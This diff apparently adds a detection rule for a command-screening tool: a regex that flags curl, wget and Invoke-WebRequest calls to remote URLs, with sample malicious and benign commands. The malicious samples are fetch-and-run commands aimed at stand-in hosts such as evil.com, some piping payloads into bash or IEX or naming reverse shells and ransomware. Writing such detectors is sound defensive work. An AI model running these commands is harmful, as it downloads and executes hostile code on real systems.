@@ -1,0 +1,43 @@
+name: medium-15-download-commands
+severity: medium
+description: >
+  Detects general download commands (curl, wget, IWR) from remote URLs. Requires allowlisting for legitimate use.
+
+pattern: |
+  (?i)(curl|wget|invoke-webrequest|iwr).*(https?|ftp)://
+
+malicious:
+  - "curl http://evil.com/malware.exe -o malware.exe"
+  - "wget https://attacker.com/payload.sh"
+  - "Invoke-WebRequest http://malware.com/backdoor.dll -OutFile backdoor.dll"
+  - "IWR https://evil.com/dropper.ps1 | IEX"
+  - "curl -fsSL http://bad.com/script.sh | bash"
+  - "wget -qO- http://evil.com/exploit.sh | sh"
+  - "curl http://192.168.1.100/clickfix.exe -o clickfix.exe"
+  - "Invoke-WebRequest -Uri http://evil.com/ransomware.exe -OutFile C:\\Temp\\ransomware.exe"
+  - "wget ftp://attacker.com/trojan.bin -O /tmp/trojan.bin"
+  - "IWR http://malware.com/implant.dll -Method Get -OutFile implant.dll"
+  - "curl -s http://evil.com/reverse-shell.sh -o /tmp/rs.sh"
+  - "wget --no-check-certificate https://evil.com/malware.exe"
+  - "Invoke-WebRequest https://attacker.com/stage2.ps1 -UseBasicParsing -OutFile stage2.ps1"
+  - "curl http://evil.com/backdoor.py -o backdoor.py"
+  - "wget -q http://malware.com/loader.dll"
+
+benign:
+  - "ls -la"
+  - "cd /home/user"
+  - "echo test"
+  - "ps aux"
+  - "grep pattern file.txt"
+  - "cat file.txt"
+  - "touch newfile.txt"
+  - "mkdir test"
+  - "rm oldfile.txt"
+  - "mv file1.txt file2.txt"
+  - "cp source.txt dest.txt"
+  - "chmod +x script.sh"
+  - "sudo apt update"
+  - "python script.py"
+  - "node app.js"
+  - "git status"
+  - "docker ps"
